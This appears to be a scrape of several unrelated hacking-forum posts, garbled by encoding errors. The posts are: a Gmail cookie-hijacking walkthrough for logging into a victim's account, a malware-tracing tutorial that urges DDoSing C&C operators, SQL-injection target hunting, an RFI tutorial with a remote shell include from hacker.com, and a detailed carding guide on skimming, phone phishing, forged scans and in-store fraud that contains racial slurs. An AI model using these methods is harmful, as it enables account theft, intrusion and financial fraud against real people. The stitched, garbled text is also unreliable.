This tool because of its ease to use. Open Network Miner by clicking its exe (pls note it requires .Net framework to work). From the ÃÆÃâÃâÃÂ¢ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¡ÃâÃÂ¬ÃÆÃ¢â¬Â¦ÃÂ¢Ã¢âÂ¬Ãâ---Select network adaptor in the  list---ÃÆÃâÃâÃÂ¢ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¡ÃâÃÂ¬ÃÆÃ¢â¬Â¦ÃÂ¢Ã¢âÂ¬Ãâ click on down arrow and select your adaptor If  you are using Ethernet wired network then your adaptor would have  Ethernet name and IP address of your machine and if you are using  wireless then adaptor name would contain wireless and your IP address.  Select the one which you are using and click on start. Important thing before you start this make sure you are not browsing any  websites, or using any Instant Mesaging and you have cleared all  cookies from firefox. Click on Credential Tab above. This tab will capture all HTTP cookies ,  pay a close look on ÃÆÃâÃâÃÂ¢ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¡ÃâÃÂ¬ÃÆÃ¢â¬Â¦ÃÂ¢Ã¢âÂ¬ÃâHostÃÆÃâÃâÃÂ¢ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¡ÃâÃÂ¬ÃÆÃ¢â¬Å¡ÃâÃÂ column you  should see somewhere mail.google.com. If you could locate  mail.google.com entry then in the same entry right click at Username  column and click on ÃÆÃâÃâÃÂ¢ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¡ÃâÃÂ¬ÃÆÃ¢â¬Â¦ÃÂ¢Ã¢âÂ¬Ãâcopy usernameÃÆÃâÃâÃÂ¢ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¡ÃâÃÂ¬ÃÆÃ¢â¬Å¡ÃâÃÂ then  open notepad and paste the copied content there. Remove word wrap from notepad and search for GX in the line. Cookie  which you have captured will contain many cookies from gmail each would  be separated by semicolon ( GX cookie will start with GX= and will end  with semicolon you would have to copy everything between = and semicolon Example : GX= axcvb1mzdwkfefv ; ÃÆÃâÃâ Ã¢â¬â¢ÃÆÃ¢â¬Â¦ÃâÃÂ¸copy only axcvb1mzdwkfefv Now we have captured GX cookie its time now to use this cookie and  replay the attack and log in to victim email id, for this we will use  firefox and cookie editor add-ons. C.) Using Firefox & cookie Editor to replay attack. Open Firefox and log in your gmail email account. From firefox click on Tools > cookie Editor. In the filter box type .google.com and Press Filter and from below list  search for cookiename GX. If you locate GX then double click on that GX  cookie and then from content box delete everything and paste your  captured GX cookie from stepB.4 and click on save and then close. From the Address bar of Firefox type mail.google.com and press enter,  this should replay victim GX cookie to Gmail server and you would get  logged in to victim Gmail email account. Sorry!

0	[TUT] Detecting and Tracing Malware	"""   Briefing Information : In this tutorial I will show you how to detect malware and trace it via packet sniffing. Things you need : VMWare - This is highly  recommended. If you dont have it, use torrents or google to find a good  installation with a working key. I am NOT providing this. sorry  WireShark - [HIDE-REPLY] Hidden Content:  You must reply to see links [/HIDE-REPLY] Sandboxie - [HIDE-REPLY] Hidden Content:  You must reply to see links [/HIDE-REPLY] PART 1 - Setting up 1) Download and Install VMWare, install the operating system of your choice 2) Download WireShark. Make sure you install WinPcap with it if you dont already have it installed. 3) Download Sandboxie. install it, no need for the full version at the moment.  PART 2 - Detecting malware **I RECOMMEND THAT YOU DO THIS IN VMWARE. This is more important for part 3 but still recommended** For this tutorial, I recommend you use your own malware until you know  what your doing. I will be using an IRC bot for this example.  Basically what we are doing first is using Sandboxie to detect if a file  has a backdoor in it. I will show you two examples first, Example 1 is  putty by itself (clean). Example 2 will be putty with a binded file  (backdoor). 1 ) Right click on the program  you want to run, and select \""Run Sandboxed\"" (the free version will make u  wait like 5 sec then just hit continue or whatever if it asks) NOTE: IT WILL OPEN THE PROGRAM. DO NOT WORRY YOU ARE SAFE!!! this is what sandboxie is for! Hidden Content:  You must reply to see links 2 ) Here is where I show you the  difference in binded files. Bring up the sandboxie window if its not up  already and you should see something similar to the screens below. Example 1 - A non-binded file.  Hidden Content:  You must reply to see links Example 2 - Infected file (Backdoor binded to it) Hidden Content:  You must reply to see links Note the difference. Its pretty obvious. You WILL NOT see this program  running, but you will see the main program running. Dont worry you are  still safe! remember, sandboxie is keeping you safe.  This is not the only method for detecting malware but it is one of the  easiest. I use sandboxie on EVERYTHING I download. You would be suprised  how much bullshit I find! Also, this method will is great for finding binded files, but if the  file is a virus and not binded it may be hard to tell if its actually a  virus. Sometimes it will download a file and run it, which will then  show up in the list a few seconds later. I advise you to run the steps  from PART 3 if you have any suspicion on a download. PART 3 - Tracing the C&C (Command and Control) Center Ok, now that you have detected the binded file, lets trace it to see  where it leads. I will give some ideas you can do with what you get out  of the tracing at the end of this tutorial. NOTE : Certain things encrypted for SSL connections may not exactly be tracable.  NOTE 2 :  If the file is not binded, this is a great way of determining if its  malware or a legit program! if its malware, its making a bad connection  and you can figure that out by what info this method gives you! Lets begin with the fun part! I highly recommend that you do this in VMWare. I will explain more on why momentarily. 1 ) This isnt exactly mandatory  but you really should close ALL open programs that access the internet  in some way. (Browsers, Dropbox, stuff like that connected to the  internet. This is where VMWare comes in handy. If you do this on a clean  install on VMWare, theres nothing needed to close and it makes the next  steps alot easier. 2 ) Open Wireshark. Select your working connection in the Interface List. See image below. Hidden Content:  You must reply to see links 3 ) Now that you have WireShark  open you should be seeing some packets up on the screen... If you give  it a quick test and open a browser, you will see the packets as they  come in. (probably a shitload of them) Wireshark Screen Hidden Content:  You must reply to see links 4 ) Now, run your binded program  in sandboxie. When the malware runs in sandboxie, it will be trying to  connect to its C&C. Your WireShark will be adding packets to its  list. We will see the packet its sending and thats how we will trace the  malware. It may take a bit to find depending on how many packets are  coming in, Where its connecting to etc..  In my example I am using an IRC bot, So thats what we will be looking  for! The best way to find what your looking for is by IP. If you dont  have anything open you will get a few packets with the same IPs over  and over, once you open the malware, the new ip should be fairly easy to  spot (again, i say easy if your on vmware with nothing else running) Here is how It looks when i find the evil IP.  Hidden Content:  You must reply to see links 5 ) Now that we have found the  C&C IP, lets go a step further with it! Right click the IP, and  select \""Follow TCP Stream\"". It will bring up a screen with some info as  shown below. This will give you an idea on what type of malware it is.  The information shown will vary depending on the malware, here is how an  IRC bot looks.  Hidden Content:  You must reply to see links This also gives other info such as irc server build, how many infects on  server etc... As of this point you have successfully traced malware  back to its C&C server. CONGRATS!!! This is just the beginning of what you can do! There are a few things you can do from here. 1 ) If an irc server and its not secure, you can easily get on and steal someones bots. 2 ) DDOS. you have the fuckers ip  address, if they are using a RAT or something like that, its most  likely off their home connection so you can feel free to knock them  offline for as long as you wish  3 ) Report the IP or DNS.  Especially useful for white hats. IF they are using a no-ip, report  their DNS, with proof its almost guaranteed that they will IP ban them. I  am actually banned from no-ip for this reason  4 ) Think about it... Im sure you can find something to do with the information you find. Thanks  for reading my tutorial. I hope this has helped you learn something  new. Please feel free to ask any questions I will be glad to help. Also,  all thanks, reps, etc greatly appreciated.  Kurosaki EDIT: Here is an example of a RAT this is the no-ip connection Hidden Content:  You must reply to see links this is what the TCP stream of BlackShades RAT looks like.

0	A Basic Guide to Forum Behavior	""" 1.  Dont Troll Keep your other forums single-word memes with you. 2.  Dont type like an idiot NONE OF THIS ALL CAPS STUFF. N0n3 0f d15 5h17. Normal typing. 3.  Dont insult people over the internet It makes you look like an idiot. Also, dont feed into a troll. No matter how offensive, if no one replies, they will go away. 4.  Use as close to proper grammar as you can Nobody expects you to be Mr. Perfect. but isnt it annoying to read a really big run on sentence with no capitalization punctuation or anything it gets really annoying doesnt it it only takes a small stretch of fingers for a comma or a period or a apostrophe These make all of the difference, dont they? 5.  Dont ask to be spoon fed When you come onto a forum, ESPECIALLY a hacking forum, dont ask for someone to make you a FUD crypter or ask people how to do EVERYTHING. This pisses hackers off especially. If they program, they do it because they like it or get paid to do it. Not to help you. Also, see if a tutorial has already been posted for what you want to know. If an influx of people came onto a forum and started asking how to startup my computer, you would probably get really pissed off. 6.  Use Google and the search feature No need to ask pointless questions you could EASILY figure out yourself with a quick search. People probably WILL help you if you already have a clue of what you are trying to do. We arent here to spoon feed. 7.  Dont Repost Check if something has already been posted before posting something. This keeps the site a lot neater. 8.  Keep avatars and signatures as decent as possible . Some nude girls are ok too me, but if somebody who tries to be \""pure in heart\"" for whatever reason, probably doesnt want to see that. Either that or he is gay... Both ways, try to be cool, but none offensive. 9.  Dont rip peoples work Give credits on posts you copy/paste, or programs that you share, if applicable. If you havent a clue who made or did something, dont worry about it. No one expects you to search the whole internet for a nickname. Also on that note, when sharing stuff, do not use sites like Sharecash UNLESS it is your own work that you made 100% yourself. Quite frankly, it annoys everyone, especially those who actually try to search for something, and all they find is constant Sharecash links for something that is not even theirs. Adf.ly, Linkbucks, Bit.ly and sites of the like are ok. 10.  Use common sense \""Common sense aint so common.\"" 11.  Say thanks... The internet is full of people who NEVER say thank you. 12.  No bumping Unless if the thread is 1 week or older do not bump it. Because if somebody makes a post needing help then if you continuously bump, then odds are their post might not be seen. So just please be patient and wait a week. ./regards            (Admins) Pratham & Mister Illutionist """

I will also provide direct links. But if you can please click the tunneled link, this will give me some money and motivation for writing other tutorials. What are Bitcoins? - Bitcoin is an experimental new digital currency that enables instant payments to anyone, anywhere in the world. Bitcoin uses peer-to-peer technology to operate with no central authority: managing transactions and issuing money are carried out collectively by the network. Bitcoin is also the name of the open source software which enables the use of this currency. -bitcoin.com [video=youtube;Um63OQz3bjo]http://www.youtube.com/watch?v=Um63OQz3bjo&feature=player_embedded[/video] What is Bitcoin mining then? -Bitcoin Mining is when you use your computers CPU/GPU card to solve mathematical problems that keeps the bitcoins network running. The bitcoin network works with blocks, when a block is solved by a miner they will get 50 Bitcoins, tough its not as easy as it sounds. To keep long things short, because this isnt a tutorial about mining, I have a MSI CX640 with a Intel core i3 processor and a NVIDIA GeForce GT 520M. And have an average hashrate of 7,5 Mhash/sec. With this speed it will take me 423 DAYS to make 1 BTC. If I do this minus the price I will have to pay for my electricity I will make a loss of €400 a year I think. So this isnt really an option. Altough If you have the money to invest in mining rigs than bitcoin mining can be a nice source of income. A quick google search will help you to set this up. But now on to the real topic. Earning Bitcoins - Well there are some ways to make bitcoins without mining. The techniques that Im going to show you dont give a high payout. But well its about the little things isnt it? Daily Bitcoins  ( Link -  http://dailybitcoins.org/index.php  ) On Daily Bitcoins you can get free bitcoins every hours. Starting on an minimum payout of 0.00005 BTC and you have a chance to win greater amounts. If you have the chekbox checked that asks your coins to be delayed make sure that if you want your payout, you go to the payments tab and press \""execute delayed payments\"". I can vouch for them that they pay out. CoinAd  ( Link -  https://coinad.com/  ) They give bitcoins on a daily base. But if you make an account you can get free Bitcoins every hour. You can also complete offers. But most of them ask a lot of private information. So do that at your own risk. BitCrate  ( Link -  http://www.bitcrate.net  ) This you can do on a daily base. Its as simple as clicking a box and get your payout. Bitcoin Addict  ( Link -  https://bitcoinaddict.com  ) Recieve free bitcoins on a daily base. Bunny Run  ( Link -  http://boklund.nu  ) Choose the winning bunny and recieve a payout. Feed Ze Birds  ( Link -  http://feedzebirds.com/  ) Retweet tweets for BTC. You get an higher payout if you have more twitter followers. CoinUrl  ( Link -  https://coinurl.com  ) This site allows you to monetize your links. You also can advertise on the tunneling pages. I have concurrently 1 Voucher with a value of 0.005 BTC for sale. Just PM me if your intrested. Enj0y..!! :) """

Weather high profile sites or low profile sites all are found to br vulnerable to SQL injection. But the problem comes when we unable to find vulnerable sites. So today i am gonna show you how to find these sites vulnerable to SQL injection. So let get started---> Method 1(finding sql vulnerable sites on a server) As we all know on a server huge amount of sites are hosted. So using server for finding vulnerable sites is a good option.. Now lets try our first method...... 1. First select any random site like is selected  http://www.artcarworld.org 2. Now you to do a process called Reverse IP Lookup to this site so as to find site hosted on server where our selected site is hosted. To do Reverae IP Lookup you have to go to this site  http://www.yougetsignal.com/tools/web-si...eb-server/   and the selected site in the Remote address field and click on Check like in image given below.  Now in image you can see the about 581 sites are hosted on same server where our selected site is hosted. 4. Now in image ip address of the server is given in top right corner, so copy. 5. Now open  http://www.bing.com 6. In Search box type ip:98.129.229.170 php?id= and click on search icon. Must replace 98.129.229.170 with your selected server ip. 7. After that bing will search the sites which have extension php?id= like this  http://www.site.com/index.php?id=  and it will give u a list of sites which ends with this extension php?id= like in image given below. 8. Now select any of one site and add  after the url to check wheather site is vulnerable to SQL injection or not. If site is vunerable then its good if not then check other site from search result. 9. If found any site vulnerable to sql then Hack it using SQL Exploiter tools. Method Second will be explained in next post. Just comment if any problem and share my post. """
0	RFI [Remote file inclusion] Tutorial By SwapnilHaxor [In Details]	""" Intro: What is RFI?? 1.Understanding RFI 2.Finding RFI vulnerabilities 3.Exploiting RFI vulnerabilities 4.Securing RFI vulnerabilities RFI means Remote file inclusion. RFI is a type of web application security hole. On the net, there are so many sites which are vulnerable to RFI. In this tutorial, I am going to show you RFI with PHP. PHP is a web script engine. Its the most widely used one so thats why I am using it in this tutorial. Learn more about PHP:  Hidden Content:  You must reply to see links To understand what file inclusion is I am going to show a little example. This is an example site in PHP: Code: PHP Code: <?php    $content  =  Ã¢â¬ÅHello  and  welcome to the siteÃ¢â¬Â ; ?> <html> <head> <title>Hello world</title> </head> <body> <?php  echo( $content );  ?> </body> </html>  This is a very basic page. But as your page expands you might want to put the individual pages in their own files and include them in the main file depending on user input. This way, when you got pages with perhaps 10k lines of PHP code you dont have to use hours looking for the bit of code you want to edit/view. By user input I mean things like a URL GET argument. A GET argument could look like this: HTML Code: [HTML]www.site.com/index.php?page=index[/HTML] In the above example the PHP script would see the Ã¢â¬Åpage=indexÃ¢â¬Â and then show the content of Ã¢â¬ÅindexÃ¢â¬Â. The Ã¢â¬ÅindexÃ¢â¬Â can be anything, can be a file, SQL value, hard-coded variable. If it is a file, then the PHP script is most likely using the include() function and that is file inclusion.  1.Understanding RFI So, in the above text I said that file inclusion is including files in another file. Well, that is all right but what does that actually mean? Well, lets say we got 2 files. index.php content.php The index.php is the file people is going to view when they visit my page.  Hidden Content:  You must reply to see links  as usual. But we want index.php to display the contents of content.php without the user actually visiting content.php. All you would need to do is put this PHP script in the index.php: Code: (php)  PHP Code: <?php  include(& #8220;content.php***8221;);  ?>   Now we are showing the contents of content.php when the user visits index.php. If content.php was to include more PHP code it would also get executed. That is it. We just did file inclusion! However, this example is just a dummy page and would most likely not be found in real life. Lets create a new scenario. A more realistic scenario. We got the following files/pages: index.php 1.php 2.php 3.php Now, index.php is again the file the users are going to visit. On the default index we are going to display 3 links. Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links When the user clicks the first link its going to show the content of 1.php, when the user clicks the second link its going to show the contents of 2.php and when the user clicks the last link its going to show the contents of 3.php. The index.php script site would in this case look something like this(note that I am now coding like an idiot to create security holes): Code: (php)  PHP Code: if (isset( $_GET *** 91 ; page *** 93 ;)) {    include( $_GET *** 91 ; page *** 93 ; . & #8220;.php***8221;); } else {    echo( <p><a href=\""index.php?page=1\"">page1</a></p> );    echo( <p><a href=\""index.php?page=2\"">page2</a></p> );    echo( <p><a href=\""index.php?page=3\"">page3</a></p> ); }    The content of 1,2 and 3 is not important in this example so I wont say anything about that. Now, when a user clicks the page1 link he or she is taken to  Hidden Content:  You must reply to see links The PHP script in index.php will now see that the user is requesting the page called 1 and it will include the number in the URL + ***8220;.php***8221; the same goes for 2 and 3. Now, what is this ***8220;Remote***8221; part in RFI all about? Well, this belongs more in the ***8220;exploting RFI vulnerabilities***8221; part of this tutorial but I have to say something short about it now. The above code is vulnerable to RFI. You can test this by visiting: Hidden Content:  You must reply to see links That would give us an error(assuming the server administrator have not turned off ***8220;show errors***8221; in the PHP configuration). The error would look something like this: [COLOR=\""#FF0000\""] Warning: include(page4.php) [function.include]: failed to open stream: No such file or directory in PATH on line 3 Warning: include() [function.include]: Failed opening page4.php for inclusion (include_path=.;PATH) in PATH\\index.php on line 3[/COLOR]  This would tell us that the include() function used in this script is not secured and can be exploited. The way you exploit it is by getting it to include your code so that you can control the server. This is where the ***8220;remote***8221; part of RFI comes in. You can create a PHP script and save it as .txt, upload it to a server and then visit something like this: Hidden Content:  You must reply to see links Note that the ? is to get rid of the ***8220;.php***8221; at the end as we did not name the file .txt.php and also if you where to try to include a .php file from a remote server it will only give the executed output of the PHP file. Now we have successfully put out code in the PHP engine of the victim server and we are free to do whatever you can do with PHP. Which is mostly anything.  2.Finding RFI vulnerabilities Like said above. To check for the most basic vulnerabilities all you need to do is manipulate the GET arguments and look for error messages looking like the one above. For more advance ones you might need to try things out, this is called blind RFI. As you gain more knowledge about PHP and RFI you will understand how to perform blind RFIs. Here is a few examples of GET arguments manipulating: Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links Use your imagination... And for those who did not understand. The arguments does not need to be ***8220;id***8221; or ***8220;page***8221; or ***8220;site***8221;. It can be anything. There are more advance versions of RFI like POST argument RFI and even cookie RFI and HTTP header RFI and so on. But these should be easy to understand once you gain more knowledge about the HTTP protocol and TCP/IP with HTTP servers and PHP etc.  3.Exploiting RFI vulnerabilities Lets say that you have successfully found a vulnerable page. The URL is  Hidden Content:  You must reply to see links The PHP script is made in such a way that we only need to edit page=index to page=http://hacker.com/shell.txt and we now got our PHP code over to the victims server and it executes. What you should do now is try to make something called a shell. A shell is essentially just a PHP script that can perform Explorer like actions. Like read/write/edit/create files and navigate in folders etc etc. Some shells even got inbuilt exploits to gain root access on the server, but thats another story. Now, there is a truckload of premade shells out there but I really recommend you creating your own as it is good learning and most shells is actually detected by antiviruses believe it or not. So if the server you are trying to access got a antivirus it will now work and it might perhaps spoil your attack. 4.Securing RFI vulnerabilities Secure user inputs!!!! And not just those you THINK is used in SQL queries or include functions or etc. ALL user inputs should be secured. You do this by strip/disallow words or phrases or symbols in the user inputs. And the most common solution when it comes to RFI is just to make the page less dynamic and hardcode the pages. If you still want to have a dynamical editable page you MUST make sure you secure the user inputs. Check it for the word Ã¢â¬ÅhttpÃ¢â¬Â, check it for the word Ã¢â¬Å Hidden Content:  You must reply to see links , check it for Ã¢â¬Å../Ã¢â¬Â, check it for Ã¢â¬Å?Ã¢â¬Â etc etc. Disable Ã¢â¬Åshow PHP errorsÃ¢â¬Â in the PHP configuration. Do a file_exists() check. These are all easy things you can do to prevent RFI(and LFI, but that is again another story). Here is a example on a dynamic page and a hardcoded page. The dynamic one is not secure, the hardcoded one is. Dynamic: PHP Code: if (isset( $_GET *** 91 ; page *** 93 ;)) {    include( $_GET *** 91 ; page *** 93 ; .  Ã¢â¬Å . phpÃ¢â¬Â ); } else {    echo( <p><a href=\""index.php?page=1\"">page1</a></p> );    echo( <p><a href=\""index.php?page=2\"">page2</a></p> );    echo( <p><a href=\""index.php?page=3\"">page3</a></p> ); }    Hardcoded: PHP Code: if (isset( $_GET *** 91 ; page *** 93 ;)) {    if ( $_GET *** 91 ; page *** 93 ; ==  Ã¢â¬Åpage1Ã¢â¬Â )       include( Ã¢â¬Å1 . phpÃ¢â¬Â );    if ( $_GET *** 91 ; page *** 93 ; ==  Ã¢â¬Åpage2Ã¢â¬Â )       include( Ã¢â¬Å2 . phpÃ¢â¬Â );    if ( $_GET *** 91 ; page *** 93 ; ==  Ã¢â¬Åpage3Ã¢â¬Â )       include( Ã¢â¬Å3 . phpÃ¢â¬Â ); } else {    echo( <p><a href=\""index.php?page=1\"">page1</a></p> );    echo( <p><a href=\""index.php?page=2\"">page2</a></p> );    echo( <p><a href=\""index.php?page=3\"">page3</a></p> ); }    Enjoy With IHF . . """

Now for you n00bies youre probably wondering what a CVV2 is, its simply just the database of basic info for the card such as the card type (e.g. Mastercard) First and last name, address and post code, phone number of the card owner, the expiry date (and start date if its a debit card or prepaid CC), the actual CC number and the CVC (card verification code, which is the 3 digits on the back of the card).

As usual I swear against TOR for carding/scammin because most nodes are blacklisted by websites and because TOR cycles through various different proxies; and even if you configure it to go straight through an exit node of your choice its still not worth it. You can use JAP but make sure youre using some constant sock proxies from the same city, town or area that the card is from; also go wardriving and use a VPN (dont trust anyone off IRC with these, youll have to do some searching around yourself for a highly trusted one and one which wont comply with LE). You can get good SOCKS from anyproxy.net (people are selling accounts for the site in IRC all the time), thats the best place but even I ended up losing the account eventually (unknowingly I was sharing it with some Nigerian dude who became selfish). So we use SOCKS because they stay constant. But dont let that get your guard down, you want FRESH proxies everytime you card. Finding a cardable site and what cardable means Basically a cardable site holds these characteristics and what you should be looking for to determine an easily \""cardable\"" website: - The top one you need to look for on the sites TOS is that they send to any address and not just the one registered on the card (although you can easily get around this if they dont, with a COB, photoshopped verification (will go into detail later) or some social engineering over the phone). - The next important to look for is if they have a visa verification code or mastercard secure code (most of the time if you ask your vendor theyll include them in your CVV2 details textfile), if they do have one of these you have to put in and you dont have them then dont waste your time - If they ship internationally (for obvious reasons, but you can just stick to local websites and order to your local drop) - If they leave packages at the door when no ones in, or around the back in a safe area (I know of one site in the UK that has all these qualities including this one, it is perfect for carding clothes) - Also you cant forget to see what other security checks they need to do (if they need to call you up to verify or want a utility bill, passport or a scan of the actual CC) It is hard to find websites online now that have most of these qualities, therefore we have to use COBs and photoshop to help us along the way, which is what Ill go into now. Carding \""non cardable websites\"" with fake CC scans and other fake documents Okay so say you come across a site that will deliver to another house not registered on the card, but they want verificaton either through phone or scans of a utility bill, credit card or passport. For this youll want to get a pay as you go deal for a cheap shitty mobile all in fake details (say a nokia 3210, brick LMAO!), or you can use spoofcard.com to your advantage to help you. Hell if the persons details youre using is local to you and youre daring then go to their home and beige box from there; itd be very convincing. If they speak to you over the phone have all details in your mind about the item youre carding, have some bullshit story if youre having it sent to a diff address such as a family members birthday and you need it there as quick as possible as its a last minute thing, or some shit like that. If youre carding multiple sites at the same time its easy to get them mixed up, so make sure who it is calling you 1st. For CC scans and how to do them check the attachments at the end of this file, they explain so much better than I could. How you use them is once youve made them like the tuts have said to do, you then tilt them a little bit so it does actually look like a scan. To make it even more believable put some paper in the scanner (dark shade if you must), scan it and open in photoshop and then put the shopped CC scan of the front onto it and then do the same with the back, then send the scans to them via e-mail or post. Same goes for utility bills (can be got through trashing or your own, and then edited in PS). Do not use the same designs when making your CC scans, otherwise it will become too obvious. To give you a head start on mastercards (what I recommend for n00bs to go for) Im giving you a globe hologram image so you wont have to buy them in IRC; unfortunately all of my visa hologram pics are shit, but Im working on getting a good one soon. VISA hologram pic coming soon! Carding whilst on the job Getting CC, CVV, CVV2 through use of mobiles Believe it or not giving your information out to anyone anywhere is not a wise choice, you can not trust anyone in this day and age. Yes there are carders working on the inside in places where there are a lot of people around flashing off their plastic cash and using them freely without a care in the world. The most common of places for a carder to work at are brand label clothing stores such as Limeys, Charlie Browns and all the other trendy shops. Ever noticed when yourself or someone else has paid at the desk with a debit card or credit card that they bring out a keypad from under the desk, then put your card into it and have the buyer input the pin? Think again when they take your credit card and go under the desk with it to get the keypad, they are doing more than just that; just because theyre not taking the card and running off with it does not mean theyre not stealing your information. A friend of my dad used to card and work in a clothing store, he used to have a piece of play doh stuck under the desk and he used to press the card onto the piece of play doh, unfortunately he began doing it too much and because hed gotten away with it so many times he became careless and got caught out by a co worker and from what I know he is still doing time. The moral is, be careful with the play doh method. The unfortunate thing is you can only get the full info of 2 cards at the max, and you dont know exactly if youre pressing over the info of another card already put on to the play doh. Also you cant get the CVC through this method, I was just giving a classic example from the olden days. But there is a new wonderful invention called cameras, video recording, and mobile phones and they are even all working on the same thing. Its best to test it out 1st and have a camera on your phone that is at least over 2 megapixel and allows long enough video recording times. The phone is set to video record and on a lighting if needed, and taped underneath the desk for you to record both sides of the card for all the information you need, as well as being quick you can get a lot more than 2 on, depending on how long each recording lasts, you may need to start more than one recording. You need good reason to be going under the desk to get the chip and pin machine, so make the desk look cluttered up and put shit in the way of everything, such as coat hangers and various other items; or you could just flat out bullshit the customer and say that the chip and pin machine on the desk isnt working so you need to get the other one, take their card and then go under searching the desk and quickly show it to the camera phone and then get the chip and pin machine and put the card in it and then hand to the customer to put in their pin as normal, unaware you have a CVV2 to later use when shopping online. Skimming whilst on the job For skimming youll want a mini portable MSR500M reader that can be fitted on your waistline belt or of course once again under the desk, if youre a cashier. But youll also want a MSR206 writer if you plan on writing the tracks to an embossed CR-80 piece of plastic later (you can make these yourself but embossers are expensive and its an expensive procedure, so wait a while until you do that yourself and buy them from IRC (be careful, people like to rip with plastics, or youll get shit quality if you dont watch out). If you plan to just sell the dumps on IRC then thats fine, but youll still need the PIN as well, so if youre a waiter you can get a cheeky peek at them putting their pin into the chip and pin device while you keep hold of it slightly (have them put the pin in while theyre sat down and youre standing up). Its much easier to skim in a restaurant rather than clothing retail, as you dont have to think it out and set it up as much. You can keep the MSR500M in your front pocket of the uniform youre wearing and pretend to be giving the card a clean on the sleeve (bullshit and say the device wont read it), while really youre giving it a swipe into your reader. This way the person doesnt even get suspicious because you dont take their card out of sight with them. I guess you could do that technique with clothing retail too when you get their card in your dirty little hands, but peeking for the PIN is harder or youll have to have a friend shoulder surf for it (or if theyre on the next register have them use a sony cyber shot c902 camera phone and pretend to have them talking on the phone while really theyre recording the person next to them putting in their PIN; cybershots are really inconspicuous looking with their cameras and VERY clear [5mpixel]). Ill go into detail what to do with the dumps you have later in the instore carding section. Using carbonless receipts to get details (pretty outdated method) If the store you work at hasnt gone carbonless on the transactions information then you can get most of the info from the receipt you get a copy of for yourself and note down the pin on this as well when/if you get it. Trashing Trashing for receipts and credit reports (pretty outdated although still works) Ever heard the expression \""Another mans trash is another mans gold\""? Thats exactly what this is. Youd be surprised how many people havent heard of a paper shredder or bonfire. They just dump their financial records containing SSNs/NI, full name, address, bank, credit card number, CVV, CVV2 etc. All on forms people couldnt be bothered to dispose of properly because they thought they were JUST old records. Again carders wok on the inside again for when they want to do trashing, a lot of janitors wear rags but youd be surprised how secretly rich most of them are (along with the other shit they steal from work as well). But also from this if there is not enough info for you on the forms then there is definitely the phone number of the mark on the form that theyve scrapped; almost always, and if not then there is enough info on their to look them up in the phone directory. Then of course you use social engineering skills over the phone to get the extra info that you need. If you know of a store that is not carbonless, then go trashing in the bins at the back of the store for the receipts with the credit card details on it. Phishing over the phone Phishing over the phone for details Ever had telemarketers ask for your credit card info over the phone? (this is if you havent already hung up by just hearing a nigger or paki on the phone) chances are theyre a carder. Believe it or not there are people actually stupid enough to fall for these obvious scams. Even more people fall for this if they believe that the caller is from the credit card company itself or part of the secret service or credit fraud investigations; the FBI, CIA and police have nothing at all to do with credit card fraud believe it or not. If you sound professional or part of an important group such as investigations then people are more likely to comply with you if they believe that their card has been used for credit fraud purposes and have to give their credit card info and billing address for verification. The best time to call up the mark is when they are at work as itll take them by surprise and theyll be wanting to get it sorted asap so that they can get back to work. Also if its \""serious\"" then the secret service dont wait for you to finish work before they question you. Play along well to the part youre pretending to be. Some social engineering skills are required and you must gain the experience of lying to people yourself. Before calling up the person find out as much information about them as you can. If youve stolen a CC from someone personally you can call them up pretending to be their bank and tell them there has been some suspicious charges made to the credit card from places such as South Africa, Nigeria, Turkey, Russia; places like that, get them to confirm their details (milk as much as you want out of them, ask them bullshit security questions such as their mothers maiden name, address, etc; you may as well, itll make it easier to get a COB for you to use). You can also get their PIN out of them if you want as well by either straight out asking them to confirm it, or be crafty and after youve told them to verify their PIN youre putting them through to a different department; then play some cheesy music down the phone for a few mins, have a female voice recording (use AV vocie changer) asking them to input their PIN on their dialpad (this wont be as suspicious); get these recorded so they can be decoded with DTMF decoding hardware/software later (although its expensive). Guessing DTMF tones is pretty easy too, but you need to know what each tone sounds like, its preferred to use decoding software to ensure you have it correct. If you try hard enough you can get full info about anyone over the phone (I suggest using spoofcard for this). Keylogging for CVV2s Hardware keylogging First of all its best if you use hardware keyloggers here that you put into the keyboard of a computer belonging to an area where a lot of people are going online a lot and logging into e-mails, ebays, paypals etc, pretty much giving you enough info for you to go searching through if you get in their e-mails, or maybe youre lucky enough to get someone who is buying something online anyway. Get the keyloggers And come back within 2 days time or so and collect the keylogger after doing some browsing yourself (as to not look suspicious just coming in and then leaving a few seconds later). Or of course you could set one up in a business and do the classic call in and do some social engineering from the credit card company or secret service and have them go to the bank online and have them log in to verify, or maybe even have them log in to a fake bank online made by yourself that will collect anyones info who logs in on it. Carding Instore Instore carding is the act of skimming a credit card and writing the dumps and track1+2 to a CR-80 piece of plastic and then either cashing out at the ATM or shopping for goods instore, as long as you have the PIN as well through whatever method you choose to use. How its done is through the use of thejerm software or any other magstripe utility software (thejerm is the best to use). And you do it like this: 1. Load up thejerms software 2. hit settings tab 3. hit \""Defaults\"" in Leading Zeros box 4. hit \""75 bpi\"" in Set Track 2 density box 5. go bak to actions 6. hit LoCo or HiCo in Coercivity box, depending on which you want to do 7. input your tracks 1 & 2 (without the % ; or ? symbols because the program already does it for you) 8. hit Write Card and swipe your card. (i usually do a read card afterwards to make sure everything went ok) 9. GO SHOPPING!!! Download thejerm  I was a member of this site and it came from there so dont worry about it not being safe, I used this software a lot back in the day. Now how you should act when you go carding instore is pretty much common sense, but some people get caught up in the moment with nerves, cockiness or just too much weird amounts of excitement. Simple what you do, make sure you KNOW the PIN for the card youre using before you go, dont be stuck at the counter trying to remember it. If youre going to be carding expensive goods then dress smart for the occasion, wear brand named clothing (that youve previously carded :P) or even a suit. It would look suspicious someone with a hoodie going into a store and buying a Louis Vuitton watch, so walk in with style. When you go instore, you ACT like you are using your own card, because essentially thats what it is (well it is now anyway lol) no looking shifty and dont look at the fucking cameras; the cameras mean nothing anyway, they dont know your name or where you live, theyre not being watched half of the time, so stop worrying about the fucking cameras; remember youre doing nothing wrong. When you go in, dont rush take your time, browse around some other items. Find the item you want to card and even ask the employee simple questions about it (if its a TV or comp just ask questions about certain specs and if its good for playing video games on). Youll be most nervous 